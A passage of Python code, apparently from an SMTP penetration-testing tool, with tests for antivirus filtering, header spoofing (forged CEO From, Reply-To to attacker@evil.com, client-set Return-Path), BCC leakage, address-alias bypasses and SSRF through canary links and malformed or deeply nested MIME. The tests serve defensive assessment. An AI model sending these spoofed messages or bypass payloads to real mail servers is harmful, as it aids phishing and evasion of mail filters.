                msg[k] = str(v)

            if body_base64 is not None:
                part = MIMEText("", "plain", "utf-8")
                part.set_payload(body_base64)
                part["Content-Transfer-Encoding"] = "base64"
                msg.attach(part)
            elif body_qp is not None:
                part = MIMEText("", "plain", "utf-8")
                part.set_payload(body_qp)
                part["Content-Transfer-Encoding"] = "quoted-printable"
                msg.attach(part)
            else:
                msg.attach(MIMEText(body, "plain", "utf-8"))
            if body_html:
                msg.attach(MIMEText(body_html, "html", "utf-8"))
            for att_name in attachments:
                att_path = att_dir / att_name
                if not att_path.is_file():
                    missing.append(att_name)
                    continue
                part = MIMEBase("application", "octet-stream")
                with open(att_path, "rb") as f:
                    part.set_payload(f.read())
                encode_base64(part)
                part.add_header("Content-Disposition", "attachment", filename=att_name)
                msg.attach(part)
            return msg.as_string(), missing

        for cat in categories:
            cat_path = base_path / "categories" / cat
            msg_dir = cat_path / "messages"
            att_dir = cat_path / "attachments"
            msg_files = sorted(msg_dir.glob("*.json")) if msg_dir.is_dir() else []
            if not msg_files and skip_absent:
                continue
            if not msg_files:
                cat_results.append(
                    AntivirusCategoryResult(
                        category=cat,
                        sent=0,
                        accepted=0,
                        rejected=0,
                        error=0,
                        smtp_trace=(),
                        detail=f"No definition files in {msg_dir}" if msg_dir.is_dir() else f"Category path missing",
                    )
                )
                continue
            accepted, rejected, err_count = 0, 0, 0
            smtp_trace: list[str] = []
            for mf in msg_files:
                try:
                    with open(mf, encoding="utf-8") as f:
                        msg_def = json.load(f)
                except (json.JSONDecodeError, OSError) as e:
                    err_count += 1
                    smtp_trace.append(f"{mf.name}: load error {e}")
                    continue
                raw_msg, missing_att = _build_mime(msg_def, att_dir, msg_dir)
                if missing_att:
                    err_count += 1
                    warn_msg = f"{mf.name}: missing attachments {missing_att} – test incomplete (avoid false SECURE)"
                    smtp_trace.append(warn_msg)
                    if not self.use_json:
                        warn_icon = get_colored_text("[!]", color="WARNING")
                        self.ptprint(f"    {warn_icon} {cat}: {warn_msg}", Out.TEXT)
                    continue
                smtp, conn_err = _connect_av()
                if smtp is None:
                    err_count += 1
                    smtp_trace.append(f"{mf.name}: connection failed {conn_err}")
                    continue
                try:
                    smtp.docmd("EHLO", self.fqdn or "av-test.local")
                    smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                    if status not in (250, 251):
                        rejected += 1
                        smtp_trace.append(f"{mf.name}: {status} (rejected)")
                        try:
                            smtp.quit()
                        except Exception:
                            pass
                        continue
                    for c in cc_list:
                        s, _ = smtp.docmd("RCPT", f"TO:<{c}>")
                        if s not in (250, 251):
                            break
                    data_status, data_reply = smtp.data(raw_msg)
                    if data_status == 250:
                        accepted += 1
                        smtp_trace.append(f"{mf.name}: 250 (accepted)")
                    elif 400 <= data_status < 500:
                        rejected += 1
                        smtp_trace.append(f"{mf.name}: {data_status} (rejected)")
                    else:
                        rejected += 1
                        smtp_trace.append(f"{mf.name}: {data_status} (rejected)")
                    try:
                        smtp.quit()
                    except Exception:
                        pass
                except (
                    smtplib.SMTPResponseException,
                    smtplib.SMTPServerDisconnected,
                    ConnectionResetError,
                    BrokenPipeError,
                    OSError,
                    socket.timeout,
                ) as e:
                    err_count += 1
                    smtp_trace.append(f"{mf.name}: error {e}")
                    try:
                        smtp.quit()
                    except Exception:
                        pass

            sent = len(msg_files)
            detail = f"{accepted} accepted, {rejected} rejected, {err_count} error"
            cat_results.append(
                AntivirusCategoryResult(
                    category=cat,
                    sent=sent,
                    accepted=accepted,
                    rejected=rejected,
                    error=err_count,
                    smtp_trace=tuple(smtp_trace[-30:]),
                    detail=detail,
                )
            )

        elapsed = time.perf_counter() - start_time
        total_accepted = sum(c.accepted for c in cat_results)
        total_rejected = sum(c.rejected for c in cat_results)
        risky_accepted = sum(c.accepted for c in cat_results if c.category in RISKY_CATEGORIES)
        risky_sent = sum(c.sent for c in cat_results if c.category in RISKY_CATEGORIES)
        all_error = all(c.sent == 0 or (c.error == c.sent) for c in cat_results) and len(cat_results) > 0
        indeterminate = all_error or (len(cat_results) == 0)
        vulnerable = risky_accepted > 0 and risky_sent > 0
        partial_protection = not vulnerable and total_accepted > 0 and total_rejected > 0
        detail = "All risky content blocked" if not vulnerable and not indeterminate else (
            f"Risky content passed: {risky_accepted}/{risky_sent} in risky categories"
        )
        return AntivirusResult(
            vulnerable=vulnerable,
            indeterminate=indeterminate,
            partial_protection=partial_protection,
            categories=tuple(cat_results),
            elapsed_sec=elapsed,
            detail=detail,
        )

    def test_spoof_headers(self) -> SpoofHeaderResult:
        """
        Test header spoofing (From, Reply-To, Return-Path).
        Sends messages with spoofed headers and records accepted vs rejected.
        Uses MIMEText/as_string() for proper CRLF separation (headers vs body).
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        mail_from = self.args.mail_from or f"spoofhdrtest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        timeout = max(5.0, getattr(self.args, "spoofhdr_timeout", 30.0))
        variants_arg = getattr(self.args, "spoofhdr_variants", None)
        default_variants = ["from", "reply_to", "return_path"]
        if variants_arg:
            variants = [v.strip().lower().replace("-", "_") for v in variants_arg.split(",") if v.strip()]
        else:
            variants = list(default_variants)

        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        auth_user = getattr(self.args, "user", None) or ""
        auth_pass = getattr(self.args, "password", None) or ""
        do_auth = bool(auth_user and auth_pass)

        start_time = time.perf_counter()
        var_results: list[SpoofHeaderVariantResult] = []
        VULNERABLE_NOTE = (
            "Zpráva byla přijata, ale její konečný dopad závisí na SPF/DMARC politice cílové domény "
            "a schopnosti koncového klienta detekovat spoofing."
        )

        def _connect_sh() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                else:
                    smtp = smtplib.SMTP(timeout=timeout)
                    st, _ = smtp.connect(host, port)
                    if st != 220:
                        return None, f"Connect: {st}"
                    if use_starttls:
                        st2, _ = smtp.docmd("STARTTLS")
                        if st2 != 220:
                            return None, f"STARTTLS: {st2}"
                        try:
                            ipaddress.ip_address(host)
                            _sni = None
                        except ValueError:
                            _sni = host
                        sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                        smtp.sock = sock_ssl
                        smtp.file = None
                        smtp.helo_resp = None
                        smtp.ehlo_resp = None
                        smtp.esmtp_features = {}
                        smtp.does_esmtp = False
                smtp.docmd("EHLO", self.fqdn or "spoofhdr-test.local")
                if do_auth:
                    try:
                        smtp.login(auth_user, auth_pass)
                    except smtplib.SMTPAuthenticationError as e:
                        return None, f"AUTH failed: {e}"
                return smtp, ""
            except Exception as e:
                return None, str(e)

        # Variant 1: From – MAIL FROM (envelope) != From (header)
        if "from" in variants:
            envelope_addr = mail_from
            from_header = "CEO <ceo@trusted-company.com>"
            msg = MIMEText("Spoof headers – From spoof test.\r\n", "plain", "utf-8")
            msg["From"] = from_header
            msg["To"] = f"<{rcpt}>"
            msg["Subject"] = "Spoof headers – From spoof test"
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg["X-PT-Test"] = "SPOOFHDR"
            raw_msg = msg.as_string()
            smtp, conn_err = _connect_sh()
            accepted, rejected, err = False, False, False
            status_code, reply_str = None, None
            detail = ""
            envelope_header_mismatch = True  # MAIL FROM != From
            if smtp is None:
                err = True
                detail = f"Connection failed: {conn_err}"
            else:
                try:
                    smtp.docmd("MAIL", f"FROM:<{envelope_addr}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                    if status not in (250, 251):
                        rejected = True
                        status_code, reply_str = status, (reply.decode() if isinstance(reply, bytes) else str(reply))
                        detail = f"RCPT rejected: {status}"
                    else:
                        data_status, data_reply = smtp.data(raw_msg)
                        status_code = data_status
                        reply_str = data_reply.decode() if isinstance(data_reply, bytes) else str(data_reply)
                        if data_status == 250:
                            accepted = True
                            detail = f"Server ACCEPTED message: MAIL FROM (obálka)={envelope_addr}, From (hlavička)={from_header}"
                        else:
                            rejected = True
                            detail = f"Server rejected DATA: {data_status}"
                    smtp.quit()
                except Exception as e:
                    err = True
                    detail = str(e)
            var_results.append(
                SpoofHeaderVariantResult(
                    variant="from",
                    accepted=accepted,
                    rejected=rejected,
                    error=err,
                    smtp_status=status_code,
                    smtp_reply=reply_str,
                    detail=detail or None,
                    envelope_header_mismatch=envelope_header_mismatch,
                )
            )

        # Variant 2: Reply-To – redirect replies to attacker
        if "reply_to" in variants:
            envelope_addr = mail_from
            from_header = "support@trusted.com"
            msg = MIMEText("Spoof headers – Reply-To spoof test. Please reply.\r\n", "plain", "utf-8")
            msg["From"] = from_header
            msg["Reply-To"] = "attacker@evil.com"
            msg["To"] = f"<{rcpt}>"
            msg["Subject"] = "Spoof headers – Reply-To spoof test"
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg["X-PT-Test"] = "SPOOFHDR"
            raw_msg = msg.as_string()
            smtp, conn_err = _connect_sh()
            accepted, rejected, err = False, False, False
            status_code, reply_str = None, None
            detail = ""
            if smtp is None:
                err = True
                detail = f"Connection failed: {conn_err}"
            else:
                try:
                    smtp.docmd("MAIL", f"FROM:<{envelope_addr}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                    if status not in (250, 251):
                        rejected = True
                        status_code, reply_str = status, (reply.decode() if isinstance(reply, bytes) else str(reply))
                        detail = f"RCPT rejected: {status}"
                    else:
                        data_status, data_reply = smtp.data(raw_msg)
                        status_code = data_status
                        reply_str = data_reply.decode() if isinstance(data_reply, bytes) else str(data_reply)
                        if data_status == 250:
                            accepted = True
                            detail = "Server ACCEPTED message with spoofed Reply-To: attacker@evil.com"
                        else:
                            rejected = True
                            detail = f"Server rejected DATA: {data_status}"
                    smtp.quit()
                except Exception as e:
                    err = True
                    detail = str(e)
            var_results.append(
                SpoofHeaderVariantResult(
                    variant="reply_to",
                    accepted=accepted,
                    rejected=rejected,
                    error=err,
                    smtp_status=status_code,
                    smtp_reply=reply_str,
                    detail=detail or None,
                    envelope_header_mismatch=False,
                )
            )

        # Variant 3: Return-Path – client injects Return-Path (RFC 3834: server should set it)
        if "return_path" in variants:
            envelope_addr = mail_from
            msg = MIMEText("Spoof headers – Return-Path spoof test.\r\n", "plain", "utf-8")
            msg["From"] = "admin@trusted.com"
            msg["Return-Path"] = "<admin@trusted.com>"
            msg["To"] = f"<{rcpt}>"
            msg["Subject"] = "Spoof headers – Return-Path spoof test"
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg["X-PT-Test"] = "SPOOFHDR"
            raw_msg = msg.as_string()
            smtp, conn_err = _connect_sh()
            accepted, rejected, err = False, False, False
            status_code, reply_str = None, None
            detail = ""
            if smtp is None:
                err = True
                detail = f"Connection failed: {conn_err}"
            else:
                try:
                    smtp.docmd("MAIL", f"FROM:<{envelope_addr}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{rcpt}>")
                    if status not in (250, 251):
                        rejected = True
                        status_code, reply_str = status, (reply.decode() if isinstance(reply, bytes) else str(reply))
                        detail = f"RCPT rejected: {status}"
                    else:
                        data_status, data_reply = smtp.data(raw_msg)
                        status_code = data_status
                        reply_str = data_reply.decode() if isinstance(data_reply, bytes) else str(data_reply)
                        if data_status == 250:
                            accepted = True
                            detail = "Server ACCEPTED message with client-set Return-Path (Backscatter risk)"
                        else:
                            rejected = True
                            detail = f"Server rejected DATA: {data_status}"
                    smtp.quit()
                except Exception as e:
                    err = True
                    detail = str(e)
            var_results.append(
                SpoofHeaderVariantResult(
                    variant="return_path",
                    accepted=accepted,
                    rejected=rejected,
                    error=err,
                    smtp_status=status_code,
                    smtp_reply=reply_str,
                    detail=detail or None,
                    envelope_header_mismatch=False,
                )
            )

        elapsed = time.perf_counter() - start_time
        any_accepted = any(v.accepted for v in var_results)
        all_error = len(var_results) > 0 and all(v.error for v in var_results)
        indeterminate = all_error or (len(var_results) == 0)
        detail_parts = []
        if any_accepted:
            accepted_vars = [v.variant for v in var_results if v.accepted]
            detail_parts.append(f"Accepted: {', '.join(accepted_vars)}. Manual check of recipient inbox recommended.")
            from_mismatch = [v for v in var_results if v.variant == "from" and v.accepted and v.envelope_header_mismatch]
            if from_mismatch:
                detail_parts.append(
                    f"ENVELOPE vs HEADER MISMATCH: MAIL FROM (obálka) differed from From (hlavička) – server accepted."
                )
        elif not indeterminate:
            detail_parts.append("All variants rejected – server blocks spoofed headers.")
        if indeterminate:
            detail_parts.append("Could not complete – connection or other errors.")

        return SpoofHeaderResult(
            vulnerable=any_accepted,
            indeterminate=indeterminate,
            variants=tuple(var_results),
            elapsed_sec=elapsed,
            detail=" ".join(detail_parts) if detail_parts else None,
            vulnerable_note=VULNERABLE_NOTE if any_accepted else None,
        )

    def test_bcc(self) -> BccTestResult:
        """
        BCC disclosure test – sends message with To, Cc, Bcc; manual verification required.
        Envelope (RCPT TO) contains all recipients; Bcc header in DATA must be stripped by server.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt_to = str(self.args.rcpt_to).strip()
        cc_raw = getattr(self.args, "cc", None) or ""
        bcc_raw = getattr(self.args, "bcc", None) or ""
        cc_list = [a.strip() for a in cc_raw.split(",") if a.strip()]
        bcc_list = [a.strip() for a in bcc_raw.split(",") if a.strip()]
        mail_from = self.args.mail_from or f"bcctest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        timeout = max(5.0, getattr(self.args, "bcc_timeout", 30.0))
        auth_user = getattr(self.args, "user", None) or ""
        auth_pass = getattr(self.args, "password", None) or ""
        do_auth = bool(auth_user and auth_pass)

        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls

        to_addr = rcpt_to
        cc_addrs = cc_list
        bcc_addrs = bcc_list
        all_recipients = [to_addr] + cc_addrs + bcc_addrs

        VERIFICATION_INSTRUCTIONS = (
            "Check all recipients' inboxes. View Message Source / Original Header. "
            "SEARCH for 'Bcc' or Bcc recipient addresses. If NOT FOUND: SECURE. If FOUND: VULNERABLE (BCC disclosure)."
        )

        def _connect_bcc() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                else:
                    smtp = smtplib.SMTP(timeout=timeout)
                    st, _ = smtp.connect(host, port)
                    if st != 220:
                        return None, f"Connect: {st}"
                    if use_starttls:
                        st2, _ = smtp.docmd("STARTTLS")
                        if st2 != 220:
                            return None, f"STARTTLS: {st2}"
                        try:
                            ipaddress.ip_address(host)
                            _sni = None
                        except ValueError:
                            _sni = host
                        sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                        smtp.sock = sock_ssl
                        smtp.file = None
                        smtp.helo_resp = None
                        smtp.ehlo_resp = None
                        smtp.esmtp_features = {}
                        smtp.does_esmtp = False
                smtp.docmd("EHLO", self.fqdn or "bcc-test.local")
                if do_auth:
                    try:
                        smtp.login(auth_user, auth_pass)
                    except smtplib.SMTPAuthenticationError as e:
                        return None, f"AUTH failed: {e}"
                return smtp, ""
            except Exception as e:
                return None, str(e)

        start_time = time.perf_counter()
        to_hdr = ", ".join(f"<{a}>" for a in [to_addr])
        cc_hdr = ", ".join(f"<{a}>" for a in cc_addrs)
        bcc_hdr = ", ".join(f"<{a}>" for a in bcc_addrs)

        msg = MIMEText(
            "BCC disclosure test. Manual verification required – check that Bcc header is NOT visible to To/Cc recipients.\r\n",
            "plain",
            "utf-8",
        )
        msg["From"] = f"<{mail_from}>"
        msg["To"] = to_hdr
        msg["Cc"] = cc_hdr
        msg["Bcc"] = bcc_hdr
        msg["Subject"] = "Bcc header test – manual verification required"
        msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
        msg["X-PT-Test"] = "BCC"
        raw_msg = msg.as_string()

        smtp, conn_err = _connect_bcc()
        message_accepted = False
        status_code = None
        reply_str = None
        detail = ""

        if smtp is None:
            detail = f"Connection failed: {conn_err}"
        else:
            try:
                smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                for recp in all_recipients:
                    status, reply = smtp.docmd("RCPT", f"TO:<{recp}>")
                    if status not in (250, 251):
                        detail = f"RCPT TO:<{recp}> rejected: {status}"
                        break
                else:
                    data_status, data_reply = smtp.data(raw_msg)
                    status_code = data_status
                    reply_str = data_reply.decode() if isinstance(data_reply, bytes) else str(data_reply)
                    if data_status == 250:
                        message_accepted = True
                        detail = "Message sent successfully. Manual verification required."
                    else:
                        detail = f"Server rejected DATA: {data_status}"
            except Exception as e:
                detail = str(e)
            finally:
                try:
                    smtp.quit()
                except Exception:
                    pass

        elapsed = time.perf_counter() - start_time

        return BccTestResult(
            message_accepted=message_accepted,
            smtp_status=status_code,
            smtp_reply=reply_str,
            recipients_to=tuple([to_addr]),
            recipients_cc=tuple(cc_addrs),
            recipients_bcc=tuple(bcc_addrs),
            elapsed_sec=elapsed,
            detail=detail or None,
            verification_instructions=VERIFICATION_INSTRUCTIONS,
        )

    def _generate_alias_variants(self, recipient: str) -> dict[str, str]:
        """Generate alias variant addresses from base recipient (e.g. admin@example.com)."""
        if "@" not in recipient:
            return {}
        user, domain = recipient.rsplit("@", 1)
        user = user.strip()
        domain = domain.strip()
        if not user or not domain:
            return {}
        return {
            "case": f"{user.upper()}@{domain}",
            "case_domain": f"{user}@{domain.upper()}",
            "dotted": f"{'.'.join(list(user))}@{domain}",
            "plus": f"{user}+test@{domain}",
            "percent": f"user%{user}@{domain}",
            "bang_simple": f"{user}!{domain}",
            "bang_nested": f"{user}!internal.{domain}@{domain}",
        }

    def test_alias(self) -> AliasTestResult:
        """
        Alias & Addressing bypass test (PTL-SVC-SMTP-ALIAS).
        Sends messages to variant addresses (case, dotted, plus, percent, bang); manual verification required.
        """
        host = self.args.target.ip
        port = self.args.target.port
        base_address = str(self.args.rcpt_to).strip()
        mail_from = self.args.mail_from or f"aliastest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        timeout = max(5.0, getattr(self.args, "alias_timeout", 30.0))
        auth_user = getattr(self.args, "user", None) or ""
        auth_pass = getattr(self.args, "password", None) or ""
        do_auth = bool(auth_user and auth_pass)

        variants_arg = getattr(self.args, "alias_variants", None)
        default_variants = ["case", "case_domain", "dotted", "plus", "percent", "bang_simple", "bang_nested"]
        if variants_arg:
            requested = [v.strip().lower() for v in variants_arg.split(",") if v.strip()]
            variant_names = [v for v in default_variants if v in requested] or default_variants
        else:
            variant_names = default_variants

        all_variants = self._generate_alias_variants(base_address)
        variants_to_test = [(k, all_variants[k]) for k in variant_names if k in all_variants]

        VERIFICATION_INSTRUCTIONS = (
            "Verify if messages sent to '250 OK' addresses bypassed any security "
            "policies (rate limits, attachment filtering, content scanning)."
        )

        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls

        def _connect_alias() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                else:
                    smtp = smtplib.SMTP(timeout=timeout)
                    st, _ = smtp.connect(host, port)
                    if st != 220:
                        return None, f"Connect: {st}"
                    if use_starttls:
                        st2, _ = smtp.docmd("STARTTLS")
                        if st2 != 220:
                            return None, f"STARTTLS: {st2}"
                        try:
                            ipaddress.ip_address(host)
                            _sni = None
                        except ValueError:
                            _sni = host
                        sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                        smtp.sock = sock_ssl
                        smtp.file = None
                        smtp.helo_resp = None
                        smtp.ehlo_resp = None
                        smtp.esmtp_features = {}
                        smtp.does_esmtp = False
                smtp.docmd("EHLO", self.fqdn or "alias-test.local")
                if do_auth:
                    try:
                        smtp.login(auth_user, auth_pass)
                    except smtplib.SMTPAuthenticationError as e:
                        return None, f"AUTH failed: {e}"
                return smtp, ""
            except Exception as e:
                return None, str(e)

        start_time = time.perf_counter()
        var_results: list[AliasVariantResult] = []

        for variant_name, addr in variants_to_test:
            is_bang_simple = variant_name == "bang_simple"
            uucp_warning = False
            detail_str = None
            accepted = rejected = error = False
            status_code = None
            reply_str = None

            smtp, conn_err = _connect_alias()
            if smtp is None:
                error = True
                detail_str = f"Connection failed: {conn_err}"
            else:
                try:
                    msg = MIMEText(
                        f"Alias bypass test – variant '{variant_name}'. Manual verification required.\r\n",
                        "plain",
                        "utf-8",
                    )
                    msg["From"] = f"<{mail_from}>"
                    msg["To"] = f"<{addr}>"
                    msg["Subject"] = f"Alias bypass test – {variant_name} (PTL-SVC-SMTP-ALIAS)"
                    msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
                    msg["X-PT-Test"] = "PTL-SVC-SMTP-ALIAS"
                    raw_msg = msg.as_string()

                    smtp.docmd("MAIL", f"FROM:<{mail_from}>")
                    status, reply = smtp.docmd("RCPT", f"TO:<{addr}>")
                    status_code = status
                    reply_str = reply.decode() if isinstance(reply, bytes) else str(reply)

                    if status in (250, 251):
                        accepted = True
                        data_status, data_reply = smtp.data(raw_msg)
                        if data_status != 250:
                            detail_str = f"RCPT OK but DATA rejected: {data_status}"
                        if is_bang_simple:
                            uucp_warning = True
                    else:
                        rejected = True
                        detail_str = f"[{status}] {reply_str.strip()}"
                except Exception as e:
                    error = True
                    detail_str = str(e)
                finally:
                    try:
                        smtp.quit()
                    except Exception:
                        pass

            var_results.append(
                AliasVariantResult(
                    variant=variant_name,
                    address=addr,
                    accepted=accepted,
                    rejected=rejected,
                    error=error,
                    smtp_status=status_code,
                    smtp_reply=reply_str,
                    detail=detail_str,
                    uucp_warning=uucp_warning,
                )
            )

        elapsed = time.perf_counter() - start_time
        accepted_count = sum(1 for v in var_results if v.accepted)
        detail = f"{accepted_count} variant(s) accepted; manual verification required" if var_results else None

        return AliasTestResult(
            base_address=base_address,
            variants=tuple(var_results),
            elapsed_sec=elapsed,
            detail=detail,
            verification_instructions=VERIFICATION_INSTRUCTIONS,
        )

    def _get_ssrf_definitions_path(self) -> Path:
        """Base path for SSRF variant definitions."""
        return Path(__file__).resolve().parent.parent / "tests" / "smtp" / "ssrf"

    def test_ssrf(self) -> SsrfResult:
        """
        Test SSRF – server fetches links in messages (PTL-SVC-SMTP-SSRF).
        Sends test emails with canary URL; user must verify canary for incoming requests.
        """
        host = self.args.target.ip
        port = self.args.target.port
        rcpt = str(self.args.rcpt_to).strip()
        canary_url = str(getattr(self.args, "ssrf_canary_url", "")).strip()
        mail_from = self.args.mail_from or f"ssrftest@{self.fqdn}"
        mail_from = str(mail_from).strip()
        from_name = getattr(self.args, "from_name", None) or ""
        cc_raw = getattr(self.args, "cc", None) or ""
        cc_list = [a.strip() for a in cc_raw.split(",") if a.strip()] if cc_raw else []
        timeout = max(5.0, getattr(self.args, "ssrf_timeout", 30.0))
        incl_internal = getattr(self.args, "ssrf_internal_urls", False)
        variants_arg = getattr(self.args, "ssrf_variants", None)
        default_variants = ["plain", "html_link", "html_img", "html_iframe", "multipart", "ssrf_malformed", "ssrf_nested"]
        if variants_arg:
            variants = [v.strip().lower() for v in variants_arg.split(",") if v.strip()]
        else:
            variants = list(default_variants)

        base_path = self._get_ssrf_definitions_path()
        _ssl_ctx = ssl._create_unverified_context()
        use_tls = self.args.tls or port == 465
        use_starttls = self.args.starttls and not use_tls
        cc_hdr = ", ".join(f"<{c}>" for c in cc_list) if cc_list else ""
        from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f"<{mail_from}>"
        recipients = [rcpt] + cc_list
        start_time = time.perf_counter()
        var_results: list[SsrfVariantResult] = []
        VERIFICATION_INSTRUCTIONS = (
            "Monitor your canary URL for 2–5 minutes. If HTTP/HTTPS request arrives from MTA IP, verdict is VULNERABLE (SSRF)."
        )

        def _connect_ssrf() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
            try:
                if use_tls:
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                    sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                    smtp = smtplib.SMTP(timeout=timeout)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    st, _ = smtp.getreply()
                    if st != 220:
                        return None, f"Connect: {st}"
                    return smtp, ""
                smtp = smtplib.SMTP(timeout=timeout)
                st, _ = smtp.connect(host, port)
                if st != 220:
                    return None, f"Connect: {st}"
                if use_starttls:
                    st2, _ = smtp.docmd("STARTTLS")
                    if st2 != 220:
                        return None, f"STARTTLS: {st2}"
                    try:
                        ipaddress.ip_address(host)
                        _sni = None
                    except ValueError:
                        _sni = host
                    sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                    smtp.sock = sock_ssl
                    smtp.file = None
                    smtp.helo_resp = None
                    smtp.ehlo_resp = None
                    smtp.esmtp_features = {}
                    smtp.does_esmtp = False
                return smtp, ""
            except Exception as e:
                return None, str(e)

        def _build_ssrf_mime(subject: str, body: str, body_html: str | None = None) -> str:
            msg = MIMEMultipart("mixed")
            msg["Subject"] = subject
            msg["From"] = from_hdr
            msg["To"] = f"<{rcpt}>"
            if cc_hdr:
                msg["Cc"] = cc_hdr
            msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime())
            msg["X-PT-Test"] = "PTL-SVC-SMTP-SSRF"
            msg.attach(MIMEText(body, "plain", "utf-8"))
            if body_html:
                msg.attach(MIMEText(body_html, "html", "utf-8"))
            return msg.as_string()

        # Inline fallback when no definition files
        FALLBACK_VARIANTS: dict[str, dict] = {
            "plain": {"subject": "SSRF test - plain (PTL-SVC-SMTP-SSRF)", "body": "Test SSRF: {{CANARY_URL}}", "bodyHtml": None},
            "html_link": {"subject": "SSRF test - HTML link (PTL-SVC-SMTP-SSRF)", "body": "Link below.", "bodyHtml": '<html><body><a href="{{CANARY_URL}}">link</a></body></html>'},
            "html_img": {"subject": "SSRF test - HTML img (PTL-SVC-SMTP-SSRF)", "body": "Image below.", "bodyHtml": '<html><body><img src="{{CANARY_URL}}" /></body></html>'},
            "html_iframe": {"subject": "SSRF test - HTML iframe (PTL-SVC-SMTP-SSRF)", "body": "Iframe.", "bodyHtml": '<html><body><iframe src="{{CANARY_URL}}"></iframe></body></html>'},
            "multipart": {"subject": "SSRF test - multipart (PTL-SVC-SMTP-SSRF)", "body": "Plain: {{CANARY_URL}}", "bodyHtml": '<html><body><a href="{{CANARY_URL}}">link</a></body></html>'},
            "ssrf_malformed": {"subject": "SSRF test - Malformed MIME (PTL-SVC-SMTP-SSRF)"},
            "ssrf_nested": {"subject": "SSRF test - Deeply Nested (PTL-SVC-SMTP-SSRF)"},
        }

        def _build_ssrf_malformed_mime(subject: str) -> str:
            """Malformed MIME – wrong boundary in nested part (parser differential test)."""
            bnd1, bnd_wrong = "BND1", "BND_WRONG"
            raw = (
                f"From: {from_hdr}\r\n"
                f"To: <{rcpt}>\r\n"
                f"Subject: {subject}\r\n"
                f"MIME-Version: 1.0\r\n"
                f'Content-Type: multipart/mixed; boundary="{bnd1}"\r\n\r\n'
                f"--{bnd1}\r\n"
                "Content-Type: text/plain\r\n\r\n"
                "Malformed MIME – nested part uses wrong boundary to confuse parser.\r\n"
                f"--{bnd1}\r\n"
                f'Content-Type: multipart/alternative; boundary="BND2"\r\n\r\n'
                f"--{bnd_wrong}\r\n"
                "Content-Type: text/plain\r\n\r\n"
                f"SSRF test link: {canary_url}\r\n"
                f"--{bnd1}--\r\n"
            )
            return raw

        def _build_ssrf_nested_mime(subject: str, layers: int = 10) -> str:
            """Deeply nested multipart/alternative – canary URL in innermost part (parser differential)."""
            boundaries = [f"NEST{i}" for i in range(layers)]
            innermost = (
                f"Content-Type: text/plain; charset=utf-8\r\n\r\n"
                f"SSRF test – canary URL: {canary_url}\r\n"
            )
            body_part = innermost
            for i in range(layers - 1, 0, -1):
                b = boundaries[i]
                body_part = (
                    f'Content-Type: multipart/alternative; boundary="{b}"\r\n\r\n'
                    f"--{b}\r\n"
                    f"{body_part}"
                    f"--{b}--\r\n"
                )
            top_boundary = boundaries[0]
            body = f"--{top_boundary}\r\n{body_part}--{top_boundary}--\r\n"
            msg = (
                f"From: {from_hdr}\r\n"
                f"To: <{rcpt}>\r\n"
                f"Subject: {subject}\r\n"
                f"MIME-Version: 1.0\r\n"
